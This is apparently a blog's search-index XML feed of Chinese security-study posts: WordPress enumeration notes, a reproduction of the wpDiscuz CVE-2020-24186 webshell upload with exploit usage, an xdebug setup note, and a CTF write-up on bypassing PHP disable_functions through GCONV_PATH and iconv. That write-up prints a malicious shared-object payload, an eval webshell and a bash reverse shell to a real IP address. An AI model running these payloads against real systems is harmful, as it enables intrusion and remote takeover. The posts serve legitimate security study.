<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Wordpress分析</title>
      <link href="/2022/04/24/wordpress-fen-xi/"/>
      <url>/2022/04/24/wordpress-fen-xi/</url>
      
        <content type="html"><![CDATA[<h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>wordpress学习信息主要来自<a href="https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress#basic-information">HackTricks</a></p><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><p>Themes files can be found in<code>/wp-content/themes/</code></p><p>For example: Using <strong>theme twentytwelve</strong> you can <strong>access</strong> the <strong>404.php</strong> file in**:** <strong>&#x2F;wp-content&#x2F;themes&#x2F;twentytwelve&#x2F;404.php</strong></p><p>Another useful url could be: <strong>&#x2F;wp-content&#x2F;themes&#x2F;default&#x2F;404.php</strong></p><p>In <strong>wp-config.php</strong> you can find the root password of the database.</p><p>Default login paths to check: *** &#x2F;wp-login.php, &#x2F;wp-login&#x2F;, &#x2F;wp-admin&#x2F;, &#x2F;wp-admin.php, &#x2F;login&#x2F;\ ***</p><h3 id="主要文件"><a href="#主要文件" class="headerlink" title="主要文件"></a>主要文件</h3><p><code>index.php,license.txt</code></p><p><code>wp-activate.php</code> is used for the email activation process when setting up a new WordPress site.</p><pre class="line-numbers language-none"><code class="language-none">Login folders:&#x2F;wp-admin&#x2F;login.php&#x2F;wp-admin&#x2F;wp-login.php&#x2F;login.php&#x2F;wp-login.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>xmlrpc.php</code>（一个文件，使用HTTP相应码知识API错误）</p><p>is a file that represents a feature of WordPress that enables data to be transmitted with HTTP acting as the transport mechanism and XML as the encoding mechanism. This type of communication has been replaced by the WordPress <a href="https://developer.wordpress.org/rest-api/reference">REST API</a>.</p><p>The <code>wp-content</code> folder is the main directory where plugins and themes are stored.</p><p><code>wp-content/uploads/</code> Is the directory where any files uploaded to the platform are stored.</p><p><code>wp-includes/</code> This is the directory where core files are stored, such as certificates, fonts, JavaScript files, and widgets.</p><p>The <code>wp-config.php</code> file contains information required by WordPress to connect to the database such as the database name, database host, username and password, authentication keys and salts, and the database table prefix. This configuration file can also be used to activate DEBUG mode, which can useful in troubleshooting.</p><h3 id="Passive-enumeration"><a href="#Passive-enumeration" class="headerlink" title="Passive enumeration"></a>Passive enumeration</h3><pre class="line-numbers language-none"><code class="language-none">Get Pluginscurl -s -X GET https:&#x2F;&#x2F;wordpress.org&#x2F;support&#x2F;article&#x2F;pages&#x2F; | grep -E &#39;wp-content&#x2F;plugins&#x2F;&#39; | sed -E &#39;s,href&#x3D;|src&#x3D;,THIIIIS,g&#39; | awk -F &quot;THIIIIS&quot; &#39;&#123;print $2&#125;&#39; | cut -d &quot;&#39;&quot; -f2Get Themescurl -s -X GET https:&#x2F;&#x2F;wordpress.org&#x2F;support&#x2F;article&#x2F;pages&#x2F; | grep -E &#39;wp-content&#x2F;themes&#39; | sed -E &#39;s,href&#x3D;|src&#x3D;,THIIIIS,g&#39; | awk -F &quot;THIIIIS&quot; &#39;&#123;print $2&#125;&#39; | cut -d &quot;&#39;&quot; -f2Extract versions in generalcurl -s -X GET https:&#x2F;&#x2F;wordpress.org&#x2F;support&#x2F;article&#x2F;pages&#x2F; | grep http | grep -E &#39;?ver&#x3D;&#39; | sed -E &#39;s,href&#x3D;|src&#x3D;,THIIIIS,g&#39; | awk -F &quot;THIIIIS&quot; &#39;&#123;print $2&#125;&#39; | cut -d &quot;&#39;&quot; -f2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Active-enumeration"><a href="#Active-enumeration" class="headerlink" title="Active enumeration"></a>Active enumeration</h3><h4 id="Users"><a href="#Users" class="headerlink" title="Users"></a>Users</h4><pre class="line-numbers language-none"><code class="language-none">curl -s -I -X GET http:&#x2F;&#x2F;blog.example.com&#x2F;?author&#x3D;1curl http:&#x2F;&#x2F;blog.example.com&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="XML-RPC"><a href="#XML-RPC" class="headerlink" title="XML-RPC"></a>XML-RPC</h4><p>If <code>xml-rpc.php</code> is active you can perform a credentials brute-force or use it to launch DoS attacks to other resources. (You can automate this process<a href="https://github.com/relarizky/wpxploit"> using this</a> for example).</p><p>To see if it is active try to access to <strong><code>/xmlrpc.php</code></strong> and send(POST) this request:</p><pre class="line-numbers language-none"><code class="language-none">&lt;methodCall&gt;&lt;methodName&gt;system.listMethods&lt;&#x2F;methodName&gt;&lt;params&gt;&lt;&#x2F;params&gt;&lt;&#x2F;methodCall&gt;&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;&#x2F;methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;admin&lt;&#x2F;value&gt;&lt;&#x2F;param&gt;&lt;param&gt;&lt;value&gt;pass&lt;&#x2F;value&gt;&lt;&#x2F;param&gt;&lt;&#x2F;params&gt;&lt;&#x2F;methodCall&gt;&lt;methodCall&gt;&lt;methodName&gt;pingback.ping&lt;&#x2F;methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http:&#x2F;&#x2F;&lt;YOUR SERVER &gt;:&lt;port&gt;&lt;&#x2F;string&gt;&lt;&#x2F;value&gt;&lt;&#x2F;param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http:&#x2F;&#x2F;&lt;SOME VALID BLOG FROM THE SITE &gt;&lt;&#x2F;string&gt;&lt;&#x2F;value&gt;&lt;&#x2F;param&gt;&lt;&#x2F;params&gt;&lt;&#x2F;methodCall&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="x2F-wp-json-x2F-oembed-x2F-1-0-x2F-proxy-SSRF"><a href="#x2F-wp-json-x2F-oembed-x2F-1-0-x2F-proxy-SSRF" class="headerlink" title="&#x2F;wp-json&#x2F;oembed&#x2F;1.0&#x2F;proxy - SSRF"></a>&#x2F;wp-json&#x2F;oembed&#x2F;1.0&#x2F;proxy - SSRF</h3><p>Try to access <em><code>https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net</code></em> and the Worpress site may make a request to you.</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wordpress </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-24186复现</title>
      <link href="/2022/04/05/cve-2020-24186-fu-xian/"/>
      <url>/2022/04/05/cve-2020-24186-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="WordPress评论插件wpDiscuz任意文件上传漏洞"><a href="#WordPress评论插件wpDiscuz任意文件上传漏洞" class="headerlink" title="WordPress评论插件wpDiscuz任意文件上传漏洞"></a>WordPress评论插件wpDiscuz任意文件上传漏洞</h1><h2 id="CVE-2020-24186"><a href="#CVE-2020-24186" class="headerlink" title="CVE-2020-24186"></a>CVE-2020-24186</h2><h2 id="产品介绍"><a href="#产品介绍" class="headerlink" title="产品介绍"></a>产品介绍</h2><p>WordPress是一款能建立出色网站、博客或应用程序的开源软件。wpDiscuz是wordpress的一款创新，现代且功能丰富的评论插件，可充实使用wordpress所建立的网站评论部分。</p><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h3 id="漏洞危害："><a href="#漏洞危害：" class="headerlink" title="漏洞危害："></a>漏洞危害：</h3><p>wpDiscuz插件存在高危漏洞，此漏洞允许未经验证的攻击者在目标站点上传任意文件，包括php文件，可以实现远程代码执行。</p><h3 id="漏洞原因："><a href="#漏洞原因：" class="headerlink" title="漏洞原因："></a>漏洞原因：</h3><p>这个CVE主要是用户在目标站点进行评论时，可以进行上传图片文件进行评论，尝试文件上传后使用burpsuit抓包，可以向文件内容添加文件头如GIF89a，即刻上传成功。因为没有进行严格的过滤和文件名后缀的检测，中间过程有使用php的getimagesize函数来对上传文件进行判断执行，该函数返回结果中有文件大小和文件类型，如果用这个函数获取文件类型就会有问题，可以加上对应的图片文件头来伪造图片类型，因此即可上传php文件成功。</p><p>响应包中返回了文件上传后的路径，访问即可造成对应的命令执行漏洞。</p><p>综上，利用链为：在wpDiscuz模块上传php文件时使用burpsuit抓包，写入图片文件头，例GIF89a，在后面写入相应的webshell，上传后查看文件所在路径，访问即可达到远程命令执行。</p><h3 id="影响产品："><a href="#影响产品：" class="headerlink" title="影响产品："></a>影响产品：</h3><p>wpDiscuz 7.0.0 – 7.0.4</p><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>升级wpDiscuz版本。</p><p>isAllowedFileType函数中对extension后缀进行了检测，当MIME与后缀不一样时会在进入最后一步之前返回False，也就是说使用MIME的白名单来对上传文件的后缀进行了限制。</p><p><img src="/images/wpdiscuz/12.jpg" class="lazyload placeholder" data-srcset="/images/wpdiscuz/12.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"> </p><h2 id="漏洞调试环境搭建"><a href="#漏洞调试环境搭建" class="headerlink" title="漏洞调试环境搭建"></a>漏洞调试环境搭建</h2><p>Wordpress5.4.1下载地址：</p><p><a href="https://cn.wordpress.org/wordpress-5.4.1-zh_CN.tar.gz">https://cn.wordpress.org/wordpress-5.4.1-zh_CN.tar.gz</a></p><p>wpDiscuz7.0.4下载地址：</p><p><a href="https://downloads.wordpress.org/plugin/wpdiscuz.7.0.4.zip">https://downloads.wordpress.org/plugin/wpdiscuz.7.0.4.zip</a></p><p>在本机的windows环境下搭建：</p><p>1、下载phpstudy启动相应的web服务，提前在mysql建立一个wordpress数据库。</p><p>2、将wordpress解压到www目录下。</p><p>3、将wpDiscuz解压到WWW\wordpress\wp-content\plugins目录下。</p><p>4、访问wordpress按照步骤搭建网站。</p><p>5、进入到wordpress后台开启wpDiscuz插件即可。</p><h2 id="漏洞代码分析"><a href="#漏洞代码分析" class="headerlink" title="漏洞代码分析"></a>漏洞代码分析</h2><p>【详细分析过程，需要给出关键代码片段或截图】</p><p>上传图片文件尝试burpsuit抓包，发现是向wordpress&#x2F;wp-admin&#x2F;admin-ajax.php发送请求</p><p><img src="/images/wpdiscuz/1.jpg" class="lazyload placeholder" data-srcset="/images/wpdiscuz/1.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"> </p><p>于是去分析admin-ajax.php,一开始没有查到什么，后面发现require了ajax-actions.php</p><p><img src="/images/wpdiscuz/2.jpg" class="lazyload placeholder" data-srcset="/images/wpdiscuz/2.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"> </p><p>开始分析ajax-actions.php，定位到上传模块，在wp_ajax_upload_atachment这个函数里面，可以发现对上传文件的类型进行了限制，</p><p><img src="/images/wpdiscuz/3.jpg" class="lazyload placeholder" data-srcset="/images/wpdiscuz/3.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"> </p><p>一个个追溯分析肯定有点麻烦，于是接下来追踪一些有用的函数开始打上断点，然后上传文件一点一点进行debug调试，进行详细的解析，一路debug，最终确定能够造成漏洞点大致的结构如下：</p><p><img src="/%5Cimages/wpdiscuz/4.jpg" class="lazyload placeholder" data-srcset="/%5Cimages/wpdiscuz/4.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"> </p><p>上传一个php后缀的文件并且加上文件头GIF89a,从产生漏洞的地方开始追踪，可以全局搜索查看哪里使用了@getimagesize函数，最终发现在wp_get_image_mime函数里面，这里就因为文件头的伪造使最终return的mime变成了image&#x2F;gif。</p><p><img src="/images/wpdiscuz/5.jpg" class="lazyload placeholder" data-srcset="/images/wpdiscuz/5.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"> </p><p>继续追踪，返回到调用的函数，发现是先调用了isImage函数，再在里面调用了wp_get_image_mime函数。</p><p><img src="/images/wpdiscuz/6.jpg" class="lazyload placeholder" data-srcset="/images/wpdiscuz/6.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"> </p><p>在后续的检验中，持续绕过检测，成功上传文件</p><p><img src="/images/wpdiscuz/7.jpg" class="lazyload placeholder" data-srcset="/images/wpdiscuz/7.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"> </p><p>这里确定了mime类型后，由于是image&#x2F;gif，就会向$attachmentIds写入对应的值</p><p><img src="/images/wpdiscuz/8.jpg" class="lazyload placeholder" data-srcset="/images/wpdiscuz/8.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"> </p><p>最终根据$attachmentIds校验,成功写入返回包的数据，写入成功。</p><p><img src="/images/wpdiscuz/9.jpg" class="lazyload placeholder" data-srcset="/images/wpdiscuz/9.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"> </p><p>最后查看返回包的内容确定上传文件的路径，访问即可执行对应的webshell。</p><p><img src="/images/wpdiscuz/10.jpg" class="lazyload placeholder" data-srcset="/images/wpdiscuz/10.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"> </p><h2 id="武器化利用"><a href="#武器化利用" class="headerlink" title="武器化利用"></a>武器化利用</h2><p>有师傅已经写出来了，我就模仿着自己再写了一个，最终测试可以实现了上传webshell之后进行远程代码执行。  </p><p>源码：<a href="https://github.com/Sakura-501/CVE-2020-24186-exploit">https://github.com/Sakura-501/CVE-2020-24186-exploit</a></p><p>Exp使用方法：</p><p>Commands:</p><p>- Windows&#x2F;Linux:</p><p>python3 CVE-2020-24186.py -u <Base_Host> -p <BlogPost_URL> </p><p>Example：</p><p>python3 CVE-2020-24186.py -u <a href="http://127.0.0.1/">http://127.0.0.1</a> -p &#x2F;wordpress&#x2F;2022&#x2F;04&#x2F;04&#x2F;hello-world</p><p><img src="/images/wpdiscuz/11.jpg" class="lazyload placeholder" data-srcset="/images/wpdiscuz/11.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"> </p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个cve早有师傅分析完了，我先看了一遍师傅们的分析，然后自己去搭建环境分析一遍又是不一样的收获，自己debug一遍会对这一个漏洞点有着更深刻的发现。一开始我按照师傅们的分享的思路分析，发现并不是很正确，于是自己去慢慢看源代码才发现师傅们更细节的地方并没有讲清楚，所以导致一开始的我看的不是很懂。比如一开始我不知道为什么可以加上GIF89a文件头就能上传成功，师傅们的文章也没有详细写清楚。于是自己不断下断点，慢慢debug，最后发现是在php的一个原生函数getimagesize出现了问题，可以进行文件头伪造绕过。所以漏洞挖掘的复现需要亲自实现一遍才会明白更多细节。</p><p>第一次写exploit，照着师傅们的exp我自己写了一遍，基本了解了python是如何进行exp的编写，自己也学习到了很多新的东西，比如Python的optparse可以解析脚本输入的参数值等等。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.cnblogs.com/sukusec301/p/15813117.html">https://www.cnblogs.com/sukusec301/p/15813117.html</a></p><p><a href="https://www.exploit-db.com/exploits/49962">https://www.exploit-db.com/exploits/49962</a></p><p><a href="https://blog.csdn.net/qq_40989258/article/details/108753535">https://blog.csdn.net/qq_40989258/article/details/108753535</a></p><p><a href="https://github.com/h3v0x/CVE-2020-24186-WordPress-wpDiscuz-7.0.4-RCE">https://github.com/h3v0x/CVE-2020-24186-WordPress-wpDiscuz-7.0.4-RCE</a></p><p><a href="https://www.pythonf.cn/read/158357">https://www.pythonf.cn/read/158357</a></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> cve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPSTORM如何进行项目的debug</title>
      <link href="/2022/04/04/phpstorm-ru-he-jin-xing-xiang-mu-de-debug/"/>
      <url>/2022/04/04/phpstorm-ru-he-jin-xing-xiang-mu-de-debug/</url>
      
        <content type="html"><![CDATA[<h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>因为要进行wordpress的cve复现，所以需要对某些代码进行debug，可以理解的更快一些，所以查询到PHPstorm可以利用xdebug来进行项目的debug，所以尝试了好长一段时间，终于算是成功了。</p><h3 id="借鉴文章"><a href="#借鉴文章" class="headerlink" title="借鉴文章"></a>借鉴文章</h3><p><a href="https://blog.csdn.net/weixin_39988164/article/details/116510119">https://blog.csdn.net/weixin_39988164/article/details/116510119</a></p><p><a href="https://ask.csdn.net/questions/781008">https://ask.csdn.net/questions/781008</a></p><p><a href="http://i.lckiss.com/?p=4370">http://i.lckiss.com/?p=4370</a></p><p><a href="https://blog.csdn.net/maxwoods/article/details/80458374">https://blog.csdn.net/maxwoods/article/details/80458374</a></p><p>还有一些比较坑的点：</p><p>xdebug断掉调试经常无故断开：</p><p><a href="https://blog.csdn.net/qq_26486949/article/details/88857757">https://blog.csdn.net/qq_26486949/article/details/88857757</a></p><p><a href="https://blog.csdn.net/qq_41566366/article/details/100898604">https://blog.csdn.net/qq_41566366/article/details/100898604</a></p><p>查阅以上文章，加上根据自己的本地环境进行一些更改之后，就基本可以进行debug了，大功告成！</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> debug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用gconv_modules和iconv进行bypass disablele_function</title>
      <link href="/2022/04/03/li-yong-gconv-modules-he-iconv-jin-xing-bypass-disablele-function/"/>
      <url>/2022/04/03/li-yong-gconv-modules-he-iconv-jin-xing-bypass-disablele-function/</url>
      
        <content type="html"><![CDATA[<p>本文主要内容来源于</p><p><a href="https://blog.csdn.net/qq_42303523/article/details/117911859">使用GCONV_PATH与iconv进行bypass disable_functions</a></p><p><a href="https://blog.csdn.net/nicholas_duan/article/details/84397431">linux 什么是SO文件</a></p><p>相关赛题两个wp学习：</p><p><a href="https://erroratao.github.io/writeup/DASCTF2022xSU/">dasctf2022-upgdload</a></p><p><a href="https://blog.csdn.net/weixin_51458899/article/details/123782291">dasctf2022-upgdload的关于php:&#x2F;&#x2F;filter的妙用</a></p><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p><code>glibc</code>：<em>glibc</em>是GNU发布的libc库，即c运行库。<em>glibc</em>是linux系统中最底层的api，几乎其它任何运行库都会依赖于<em>glibc</em>。<em>glibc</em>除了封装linux操作系统所提供的系统服务外，它本身也提供了许多其它一些必要功能服务的实现。  </p><p><code>.so文件</code>：shared object，so文件是Linux下的程序函数库,即编译好的可以供其他程序使用的代码和数据，与windows下的dll文件差不多，就是常说的动态链接库，都是c或c++编译出来的。  也是ELF格式文件，共享库（动态库），类似于DLL。节约资源，加快速度，代码升级简化。 </p><p><code>GCONV_PATH</code>：linux系统下的一个环境变量，该环境变量能使glibc使用用户自定义的gconv-modules文件  </p><p>怎么生成以及使用一个so动态库文件? <code>gcc -fPIC -g -c s.c -o libs.o </code>  </p><p><code>-fPIC</code>：-fPIC作用于编译阶段，告诉编译器产生与位置无关代码(Position-Independent Code)，则产生的代码中，没有绝对地址，全部使用相对地址，故而代码可以被加载器加载到内存的任意 位置，都可以正确的执行。这正是共享库所要求的，共享库被加载时，在内存的位置不是固定的。  </p><p><code>-g</code>:令 gcc 生成调试信息,该选项可以利用操作系统的“原生格式（native format）”生成调试信息。GDB 可以直接利用这个信息，其它调试器也可以使用这个调试信息。  </p><p><code>-c</code>：仅执行编译操作，不进行连接操作。</p><p><code>-o</code>：指定生成的输出文件名称 。</p><h4 id="主要流程："><a href="#主要流程：" class="headerlink" title="主要流程："></a>主要流程：</h4><p>·linux环境下，php在执行<code>iconv</code>函数时会去调用<code>glibc</code>的<code>iconv_open</code>函数  </p><p>·iconv_open函数会首先去寻找系统提供的gconv-modules文件，这个文件包含了所有字符集的相关信息存储路径，每个字符集信息都存储在一个.so文件中，即gconv-modules文件提供每一个字符集的.so文件的详细位置。</p><p>·然后查询到位置之后就去调用对应的.so文件</p><p>·然后调用.so文件中的gconv和gconv_init函数，达到命令注入的目的</p><h3 id="bypass主要过程"><a href="#bypass主要过程" class="headerlink" title="bypass主要过程"></a>bypass主要过程</h3><p>首先一般在&#x2F;tmp文件夹下面上传gconv-modules文件，文件中指定我们自定义的的字符集.so文件，.so文件中书写gconv_init函数，其中填入我们需要执行的系统命令或其他危险操作。然后我们需要上传一个php的shell，里面先指定gconv_path来指向我们自己上传的gconv-modules文件，最后调用iconv函数来执行我们的恶意代码。</p><h4 id="实战模拟"><a href="#实战模拟" class="headerlink" title="实战模拟"></a>实战模拟</h4><p>首先写一个gconv-modules文件上传到&#x2F;tmp目录下</p><pre class="line-numbers language-none"><code class="language-none">module  INTERNAL    自定义字符集名字（大写）&#x2F;&#x2F;    ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;自定义字符集名字（小写）    2 module  自定义字符集名字（大写）&#x2F;&#x2F;    INTERNAL    ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;自定义字符集名字（小写）    2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后写.c文件  </p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">void</span> <span class="token function">gconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">gconv_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"希望执行的命令"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>gcc编译成.so文件,并且也要上传到&#x2F;tmp目录下</p><p><code>gcc 源代码文件名.c -o 自定义字符集名.so -shared -fPIC</code>  </p><p>最后书写php的shell.php，上传到&#x2F;tmp目录下访问执行即可</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GCONV_PATH=/tmp/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">iconv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"自定义字符集名"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"UTF-8"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"whatever"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="真实操作"><a href="#真实操作" class="headerlink" title="真实操作"></a>真实操作</h4><p>例如有个靶场源代码如下，需要bypass disable_function：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ant'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>首先使用蚁剑连接，发现没有无法执行命令，需要bypass  </p><p>上传gconv-modules文件到&#x2F;tmp目录下：  </p><pre class="line-numbers language-none"><code class="language-none">module  HACK&#x2F;&#x2F;    INTERNAL    ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;hack    2module  INTERNAL    HACK&#x2F;&#x2F;    ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;hack    2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>再写hack.c文件，使用linux系统执行编译为.so文件：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">void</span> <span class="token function">gconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">gconv_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/readflag > /tmp/flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//反弹shell写法</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">void</span> <span class="token function">gconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">gconv_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"bash -c 'exec bash -i &amp;>/dev/tcp/175.178.47.228/8888 &lt;&amp;1'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>gcc hack.c -o hack.so -shared -fPIC</code>  </p><p>生成的hack.so要上传到&#x2F;tmp目录下</p><p>然后写shell.php文件，上传到&#x2F;var&#x2F;www&#x2F;html目录下：  </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GCONV_PATH=/tmp/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">iconv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"hack"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"UTF-8"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"whatever"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>最后访问&#x2F;shell.php触发函数调用即可看到flag文件在&#x2F;tmp文件夹下生成！</p><h3 id="有关于php-x2F-x2F-filter的妙用"><a href="#有关于php-x2F-x2F-filter的妙用" class="headerlink" title="有关于php:&#x2F;&#x2F;filter的妙用"></a><strong>有关于php:&#x2F;&#x2F;filter的妙用</strong></h3><p>使用filter协议编码主动去调用.so文件，达到命令注入的目的</p><p><code>a=putenv(&quot;GCONV_PATH=/tmp/&quot;);include(&#39;php://filter/read=convert.iconv.exp.utf-8/resource=/tmp/exp.so&#39;);</code></p><h3 id="寻找拥有root权限的命令执行"><a href="#寻找拥有root权限的命令执行" class="headerlink" title="寻找拥有root权限的命令执行"></a>寻找拥有root权限的命令执行</h3><p><a href="https://blog.gtwang.org/linux/unix-linux-find-command-examples/">有关find指令参数的学习</a></p><p><a href="http://www.51gjie.com/linux/1015.html">ls -l指令详解</a></p><pre class="line-numbers language-none"><code class="language-none">-user         &#x2F;&#x2F;根据属主来查找文件find . -type f &#x2F;&#x2F;将当前目录及其子目录中的所有文件列出&#x2F;dev&#x2F;null是一个特殊的设备文件，这个文件接收到任何数据都会被丢弃。因此，null这个设备通常也被称为位桶（bit bucket）或黑洞。所以，2&gt;&#x2F;dev&#x2F;null的意思就是将标准错误stderr删掉。find . -perm 664 便是在当前文件夹下查找 owner，group有读写权限，而其他用户只有读不能写的文件。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
